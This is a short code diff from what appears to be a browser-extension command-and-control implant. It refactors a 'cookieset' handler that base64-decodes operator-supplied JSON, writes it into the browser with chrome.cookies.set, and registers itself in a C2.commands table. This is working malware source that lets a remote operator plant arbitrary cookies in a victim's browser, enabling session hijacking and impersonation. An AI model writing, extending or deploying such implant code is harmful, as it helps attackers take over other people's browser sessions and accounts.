@@ -1,5 +1,5 @@
-cookieset = function() {
-    let details = JSON.parse(atob(data['data'].toString()));
+cookieset = function(params) {
+    let details = JSON.parse(atob(params.toString()));
 
     chrome.cookies.set(details, function(cookie){
         let resp;
@@ -20,3 +20,4 @@ cookieset = function() {
 };
 
 C2.commands[cookieset.name] = cookieset;
+
